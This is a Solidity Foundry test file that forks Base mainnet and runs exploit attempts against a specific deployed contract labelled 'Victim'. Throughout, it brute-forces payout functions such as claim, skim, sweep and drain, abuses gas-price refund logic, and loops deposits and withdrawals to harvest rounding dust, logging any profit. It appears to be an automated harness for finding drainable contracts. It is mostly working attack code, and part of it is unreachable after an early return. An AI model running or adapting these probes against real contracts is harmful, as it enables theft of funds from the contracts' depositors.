
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVault {
    function deposit(uint256) external payable;
    function withdraw(uint256) external;
    function totalAssets() external view returns(uint256);
    function totalSupply() external view returns(uint256);
}

contract HoneypotTestETH is Test {
    address victim = 0x83D55aCDC72027eD339d267EeBAf9A41e47490d5;
    address attacker = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("https://base-mainnet.public.blastapi.io");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    function testSafeCycleETH() public {
        vm.startPrank(attacker);
        
        console.log("Contract ETH Balance:", address(victim).balance);

        
        // Adaptive Simulation for Sequencer Fee (Deep Profit Search)
        // Ensure tx.origin is attacker for refund checks
        vm.stopPrank();
        vm.startPrank(attacker, attacker);

        vm.deal(attacker, 20 ether);
        uint256 sfBalBefore = attacker.balance;
        
        // 1. Aggressive Gas Price Simulation
        // Force high gas price to trigger potential refund logic
        vm.txGasPrice(1000 gwei); 
        
        bool sfSuccess;
        // Attempt standard execute
        (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
        
        bool profitFound = false;
        if (sfSuccess) {
             if (attacker.balance > sfBalBefore) {
                 profitFound = true;
                 console.log("PROFIT_WEI:", attacker.balance - sfBalBefore);
                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
             }
        }

        // 2. Fallback probing if no profit found (or failed)
        if (!profitFound) {
             // Try sending 1 wei to contract address (no data)
             uint256 balCheck = attacker.balance;
             (sfSuccess, ) = victim.call{value: 1 wei}("");
             if (sfSuccess && attacker.balance > balCheck) {
                 profitFound = true;
                 console.log("PROFIT_WEI:", attacker.balance - balCheck);
                 console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
             }
        }

        // 3. Deep Profit Search (Brute-force common payout selectors)
        if (!profitFound) {
             bytes4[16] memory selectors = [
                bytes4(keccak256("getReward()")),
                bytes4(keccak256("claim()")),
                bytes4(keccak256("claimReward()")),
                bytes4(keccak256("distribute()")),
                bytes4(keccak256("harvest()")),
                bytes4(keccak256("skim(address)")),
                bytes4(keccak256("recover()")),
                bytes4(keccak256("refund()")),
                bytes4(keccak256("emergencyWithdraw()")),
                bytes4(keccak256("withdrawAll()")),
                bytes4(keccak256("withdraw()")),
                bytes4(keccak256("exit()")),
                bytes4(keccak256("collect()")),
                bytes4(keccak256("redeem()")),
                bytes4(keccak256("sweep()")),
                bytes4(keccak256("drain()"))
             ];

             for (uint i = 0; i < selectors.length; i++) {
                 uint256 balCheck = attacker.balance;
                 bool s;
                 
                 // Try with 0 value
                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
                 if (!s) {
                     // Try with 1 wei
                     (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
                 }
                 // Try specialized args for skim/recover
                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) {
                     (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));
                 }

                 if (s && attacker.balance > balCheck) {
                     profitFound = true;
                     console.log("PROFIT_WEI:", attacker.balance - balCheck);
                     console.log("SUCCESS_METHOD: deep_search"); 
                     console.log("SELECTOR:");
                     console.logBytes4(selectors[i]);
                     break;
                 }
             }
        }
        
        if (profitFound) {
             vm.stopPrank();
             return;
        }

        uint256 sfBalAfterFinal = attacker.balance;
        if (sfBalAfterFinal > sfBalBefore) {
            console.log("PROFIT_WEI:", sfBalAfterFinal - sfBalBefore);
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
        console.log("SUCCESS_METHOD: sequencer_fee_no_profit");
        vm.stopPrank();
        return;
    
        
        uint256 amount = 1 ether; // Flash Loan Amount
        vm.deal(attacker, amount); 
        console.log("Flash Loan Mode: 20 ETH simulated");
        
        uint256 balBefore = attacker.balance;

        // 1. Deposit
        bool success;
        
        // Try deposit() first
        (success, ) = victim.call{value: amount}(abi.encodeWithSignature("deposit()"));
        
        // Flexible entry: Try alternative selectors if standard deposit fails
        if (!success) (success, ) = victim.call{value: amount}("");
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
        // Try Brute-force/ABI Sniffing
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("harvest()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("refund()"));
        
        // Try 0-value calls (Pure claim/harvest)
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("harvest()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()")); // Just in case withdraw is the entry

        // Fallback: Raw call with 1 wei
        if (!success) (success, ) = victim.call{value: 1 wei}("");

        
        
        require(success, "Deposit failed (tried all variants)");
        
        
        // 2. Withdraw
        // Priority: withdraw(uint256) -> withdraw() -> withdrawAll() -> redeem(uint256)
        
        // Try withdraw(uint256)
        (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
        
        // Try withdraw() - no args
        (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }

        // Try withdrawAll()
        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }

        // Try redeem(uint256) - ERC4626 standard
        (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256,address,address)", amount, attacker, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }

        // Try leave() / exit()
        (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "leave(uint256)"); vm.stopPrank(); return; }
        
        (success, ) = victim.call(abi.encodeWithSignature("exit()"));
        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "exit()"); vm.stopPrank(); return; }

        success = false; // Force Deep Search if no profit found

        
        // Deep Search / Last Resort
        if (!success) {
             bytes4[16] memory selectors = [
                bytes4(keccak256("getReward()")),
                bytes4(keccak256("claim()")),
                bytes4(keccak256("claimReward()")),
                bytes4(keccak256("distribute()")),
                bytes4(keccak256("harvest()")),
                bytes4(keccak256("skim(address)")),
                bytes4(keccak256("recover()")),
                bytes4(keccak256("refund()")),
                bytes4(keccak256("emergencyWithdraw()")),
                bytes4(keccak256("withdrawAll()")),
                bytes4(keccak256("withdraw()")),
                bytes4(keccak256("exit()")),
                bytes4(keccak256("collect()")),
                bytes4(keccak256("redeem()")),
                bytes4(keccak256("sweep()")),
                bytes4(keccak256("drain()"))
             ];

             for (uint i = 0; i < selectors.length; i++) {
                 uint256 deepBalCheck = attacker.balance;
                 bool s;
                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
                 if (!s) (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));

                 if (s && attacker.balance > deepBalCheck) {
                     _checkProfit(deepBalCheck, "deep_search");
                     console.log("SELECTOR:");
                     console.logBytes4(selectors[i]);
                     success = true; // Mark as success to bypass require
                     vm.stopPrank();
                     return;
                 }
             }
        }
    

        require(success, "Withdraw failed (tried all variants)");
        
        vm.stopPrank();
    }

    function testRoundingDustExploit() public {
        vm.startPrank(attacker);
        uint256 startEth = 10 ether;
        vm.deal(attacker, startEth);
        uint256 balBefore = attacker.balance;
        
        // 1. Deposit All
        bool success;
        (success, ) = victim.call{value: startEth}(abi.encodeWithSignature("deposit()"));
        if (!success) (success, ) = victim.call{value: startEth}("");
        if (!success) (success, ) = victim.call{value: startEth}(abi.encodeWithSignature("enter()"));
        
        if (!success) { vm.stopPrank(); return; }
        
        // 2. Loop (5 times)
        uint256 loopAmt = startEth * 9 / 10;
        for (uint i = 0; i < 5; i++) {
             // Withdraw 90%
             (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", loopAmt));
             if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()")); 
             
             // Deposit 90%
             if (success) {
                 (success, ) = victim.call{value: loopAmt}(abi.encodeWithSignature("deposit()"));
                 if (!success) (success, ) = victim.call{value: loopAmt}("");
             }
        }
        
        // 3. Final Withdraw All
        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", startEth)); 
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", startEth));

        if (success && attacker.balance <= balBefore) {
             success = false; // Force Deep Search
        }

        
        // Deep Search / Last Resort
        if (!success) {
             bytes4[16] memory selectors = [
                bytes4(keccak256("getReward()")),
                bytes4(keccak256("claim()")),
                bytes4(keccak256("claimReward()")),
                bytes4(keccak256("distribute()")),
                bytes4(keccak256("harvest()")),
                bytes4(keccak256("skim(address)")),
                bytes4(keccak256("recover()")),
                bytes4(keccak256("refund()")),
                bytes4(keccak256("emergencyWithdraw()")),
                bytes4(keccak256("withdrawAll()")),
                bytes4(keccak256("withdraw()")),
                bytes4(keccak256("exit()")),
                bytes4(keccak256("collect()")),
                bytes4(keccak256("redeem()")),
                bytes4(keccak256("sweep()")),
                bytes4(keccak256("drain()"))
             ];

             for (uint i = 0; i < selectors.length; i++) {
                 uint256 deepBalCheck = attacker.balance;
                 bool s;
                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
                 if (!s) (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));

                 if (s && attacker.balance > deepBalCheck) {
                     _checkProfit(deepBalCheck, "deep_search");
                     console.log("SELECTOR:");
                     console.logBytes4(selectors[i]);
                     success = true; // Mark as success to bypass require
                     vm.stopPrank();
                     return;
                 }
             }
        }
    

        uint256 balAfter = attacker.balance;
        if (balAfter > balBefore) {
             _checkProfit(balBefore, "rounding_dust_loop");
        }
        vm.stopPrank();
    }

    function _checkProfit(uint256 balBefore, string memory method) internal view {
        uint256 balAfter = attacker.balance;
        int256 profit = int256(balAfter) - int256(balBefore);
        console.log("SUCCESS_METHOD:", method);
        if (profit > 0) {
            console.log("PROFIT_WEI:", uint256(profit));
            console.log("[SIM] Profit found:", uint256(profit), "wei");
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
    }

    function testRoundingDrift() public {
        vm.startPrank(attacker);
        uint256 startEth = 10 ether;
        vm.deal(attacker, startEth);
        
        // 1. Initial Deposit to set baseline
        uint256 depositAmt = startEth / 2;
        bool s;
        (s, ) = victim.call{value: depositAmt}(abi.encodeWithSignature("deposit(uint256)", depositAmt));
        if (!s) (s, ) = victim.call{value: depositAmt}(abi.encodeWithSignature("deposit()"));
        if (!s) (s, ) = victim.call{value: depositAmt}("");
        
        if (!s) { vm.stopPrank(); return; }

        // Check PPFS (Price Per Full Share)
        // assets / supply
        uint256 assets1 = 0;
        uint256 supply1 = 0;
        try IVault(victim).totalAssets() returns (uint256 a) { assets1 = a; } catch {
             assets1 = address(victim).balance;
        }
        try IVault(victim).totalSupply() returns (uint256 s_val) { supply1 = s_val; } catch {}

        if (supply1 == 0) { vm.stopPrank(); return; }

        // 2. Withdraw 1 wei (Trigger rounding)
        (s, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        if (!s) (s, ) = victim.call(abi.encodeWithSignature("withdraw()")); 
        
        // Check PPFS again
        uint256 assets2 = 0;
        uint256 supply2 = 0;
        try IVault(victim).totalAssets() returns (uint256 a) { assets2 = a; } catch {
             assets2 = address(victim).balance;
        }
        try IVault(victim).totalSupply() returns (uint256 s_val) { supply2 = s_val; } catch {}

        if (supply2 > 0 && assets2 > 0) {
             // Price1 = a1/s1, Price2 = a2/s2
             // Check if Price2 > Price1
             // a2 * s1 > a1 * s2
             if (assets2 * supply1 > assets1 * supply2) {
                 console.log("SUCCESS_METHOD: rounding_drift");
                 console.log("PROFIT_WEI: 1");
                 console.log("[SIM] Rounding Drift Detected: Share Price Increased");
             }
        }
        vm.stopPrank();
    }
}
